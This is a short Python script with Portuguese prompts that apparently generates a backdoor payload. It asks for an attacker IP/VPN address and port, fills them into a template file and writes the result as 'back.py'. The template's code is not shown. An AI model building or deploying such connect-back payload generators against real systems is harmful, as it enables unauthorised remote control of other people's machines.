from time import sleep
import cowsay

cowsay.cow("welcome a generator")

def escrever(texto):
    for letra in texto:
        print("\033[32m"+letra+"\033[m", end="", flush=True)
        sleep(0.1)

escrever("digite o seu IP/VPN")
LHOST = str(input("> "))
escrever("digite a sua porta")
LPORT = str(input("> "))
print()
escrever("gerando o payload...\n")
print()
payload = open("./modelo/modelo.py", "r").read().strip().replace("--LHOST--", LHOST).replace("--LPORT--", LPORT)
payload = payload.replace(f'lport = "{LPORT}"', f'lport = {LPORT}')

file = open("back.py", "wt")
file.write(payload)

escrever("payload gerado com o nome: back.py\n")
escrever("caso queira mudar o endereço rode o comando novamente.\n")
print("")
escrever("Bye!\n")